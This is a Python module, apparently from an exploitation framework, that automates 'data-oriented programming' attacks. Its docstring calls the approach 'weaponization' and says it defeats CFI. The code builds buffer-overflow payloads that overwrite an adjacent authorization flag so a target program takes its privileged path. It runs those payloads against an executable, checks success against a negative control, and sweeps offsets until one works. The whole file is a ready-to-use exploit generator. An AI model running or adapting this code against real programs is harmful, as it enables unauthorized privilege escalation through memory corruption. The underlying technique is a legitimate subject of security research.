"""Data-Oriented Programming (DOP) weaponization -- reach impact by corrupting DATA, not control flow.

Every control-flow L3 lykos has (ret2win/ret2libc/ret2csu/SROP/ret2dlresolve/FSOP/leak->groom) hijacks
the instruction pointer. That whole family is defeated by CFI, and it is inapplicable when a write
primitive cannot reach a code pointer at all. DOP is the orthogonal paradigm (Hu et al., S&P'16;
FlowStitch, USENIX'15): overwrite a SECURITY-DECISION variable -- an `is_admin` / `authenticated` /
`allow` flag, a bounds field, a path/command buffer -- so the program's OWN code, running normally,
takes a privileged path. No gadget, no leak, CFI-immune. The effect is a real attacker objective
(privilege gained, a guarded action performed), demonstrated by the program's own observable
behaviour rather than a spawned shell.

This module is the planner + a FORGERY-PROOF differential oracle for the most fundamental DOP
primitive: a linear write that reaches an adjacent decision variable and flips it. `plan_flag_flip`
lowers the write to bytes; `detonate_data_only` confirms the privileged path is taken AND that a
benign (non-overflowing) input does NOT take it -- so a program that prints the marker on its own, or
reaches the branch without our write, is rejected. Pure + deterministic; the oracle runs the target.
"""
from __future__ import annotations

import subprocess
from dataclasses import dataclass
from typing import Optional


@dataclass
class FlagFlipPlan:
    distance: int          # bytes from the overflow buffer's start to the decision variable
    flip: bytes            # the value written over the variable (truthy -> privileged path)
    payload: bytes         # fill-to-distance + flip
    negative: bytes        # fill up to -- but not into -- the variable (must NOT take the branch)


def plan_flag_flip(distance: int, *, flip: bytes = b"\x01", fill: bytes = b"A") -> FlagFlipPlan:
    """Lower a data-only flag flip: overflow `distance` bytes to reach a decision variable, then
    write `flip` over it (default 0x01 -> a truthy flag). The negative control fills right up to the
    variable without touching it, so if it still takes the privileged path the write was not what
    caused it."""
    if distance < 0:
        raise ValueError("distance must be non-negative")
    pad = (fill * distance)[:distance]
    return FlagFlipPlan(distance=distance, flip=flip, payload=pad + flip, negative=pad)


def _run(exe: str, data: bytes, *, input_mode: str, argv, timeout: float) -> bytes:
    """Run the target once with `data` and return stdout+stderr. Never raises."""
    try:
        a = list(argv or [])
        if input_mode == "arg":
            a = a + [data.decode("latin-1")]
            r = subprocess.run([exe] + a, capture_output=True, timeout=timeout)
        else:
            r = subprocess.run([exe] + a, input=data, capture_output=True, timeout=timeout)
        return (r.stdout or b"") + (r.stderr or b"")
    except Exception:                                        # noqa: BLE001
        return b""


def detonate_data_only(exe: str, plan: FlagFlipPlan, *, marker: bytes, input_mode: str = "stdin",
                       argv: Optional[list] = None, timeout: float = 8.0) -> bool:
    """Confirm a DOP flag-flip: the overflow makes the program emit `marker` (its privileged path's
    observable effect) AND the negative control (same input, one byte short of the variable) does
    NOT. Sound and forgery-proof against a target that prints the marker unconditionally or reaches
    the privileged branch without our write: both would make the negative control emit it too, which
    rejects the result. `marker` must be output the BENIGN path cannot produce (the guarded action's
    own signal). Returns True only when the write is the cause."""
    if not marker:
        return False
    pos = _run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout)
    if marker not in pos:
        return False
    neg = _run(exe, plan.negative, input_mode=input_mode, argv=argv, timeout=timeout)
    return marker not in neg


def sweep_flag_flip(exe: str, *, marker: bytes, max_distance: int = 256, input_mode: str = "stdin",
                    argv: Optional[list] = None, flip: bytes = b"\x01",
                    timeout: float = 8.0) -> Optional[FlagFlipPlan]:
    """When the exact buffer->variable distance is not known statically, sweep candidate distances
    and return the first plan the sound oracle confirms (a wrong distance either misses the variable
    or corrupts something that does not take the branch -> the oracle rejects it). Bounded."""
    for d in range(1, max_distance + 1):
        plan = plan_flag_flip(d, flip=flip)
        if detonate_data_only(exe, plan, marker=marker, input_mode=input_mode, argv=argv,
                              timeout=timeout):
            return plan
    return None
